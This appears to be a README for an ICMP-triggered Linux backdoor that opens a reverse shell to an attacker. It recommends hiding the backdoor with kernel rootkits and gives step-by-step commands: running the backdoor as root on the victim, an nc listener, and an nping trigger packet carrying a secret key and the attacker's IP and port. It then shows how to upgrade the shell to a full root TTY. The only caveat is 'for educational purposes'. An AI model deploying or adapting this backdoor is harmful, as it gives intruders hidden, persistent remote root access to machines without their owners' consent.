# ICMP Backdoor
A cool ICMP listener and reverse shell. Ideally, should be used in conjunction with a LKM rootkit like [Diamorphine](https://github.com/m0nad/Diamorphine) or [libprocesshider](https://github.com/gianlucaborello/libprocesshider) to hide the process. Hypothetically, this could be turned into shellcode and injected into processes with `ptrace`, but I wouldn't recommend it since this implementation isn't really minimal.

If you don't want to use `nping` to trigger the reverse shell, you can use the `live-off-the-land` version, which just requires `ping` and `nc`.

*for educational purposes!*

# Usage
On the host machine, compile and run:
```
$ make
$ sudo ./backdoor
```
You can also ensure:
```
$ ./backdoor -v
Secret Key:		wA@2mC!dq
Service Name:	        backdoor
Shell Path:		/bin/bash
```
On the attacker machine start a netcat listener:
```
$ nc -lnvp <port>
```
And send an ICMP packet to the victim:
```
$ nping --icmp -c 1 -dest-ip <victim-ip> --data-string <secret-key> <attacker-ip> <port>'
```
Now you have your shell!
```
$ nc -l -p 4096
/bin/bash
ls
bin
boot
dev
etc
home
keybase
lib
lib64
lightdm
lost+found
media
mnt
nix
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
```

# Adding TTY
If you want to make your shell actually usable with TTY, here's my process. Or alternatively, check out [these](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) [guides](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) on upgrading your shell.

First, on your host machine, ensure you're using bash:
```
$ bash
$ 
```
Then initiate your reverse shell:
```
$ nc -l -p 4096
/bin/bash
ls
bin
boot
dev
etc
...
```
Then use python to get a pseudo-terminal:
```
/bin/bash
python -c 'import pty; pty.spawn("/bin/bash")'
[root@user /]#
```
From here exit out of the terminal and do:
```
/bin/bash
python -c 'import pty; pty.spawn("/bin/bash")'
[root@user /]#
Ctrl-Z
$ stty raw -echo
$ fg
```
From here your terminal will be pretty messed up:
```
nc -lvp 4096
            [cursor somewhere here]
```
Reset the terminal via the command `reset`. You might not be able to press `enter` - if you can't, use `Ctrl-J` instead.
```
nc -lvp 4096
            reset
...
[root@user /]#
```
From here, do all the basic terminal setting stuff:
```
[root@user /]# export SHELL=bash
[root@user /]# export TERM=xterm-256color
[root@user /]# stty rows <num> columns <cols>
```
Then you should be done! Vim/nano/etc should work decent from here.
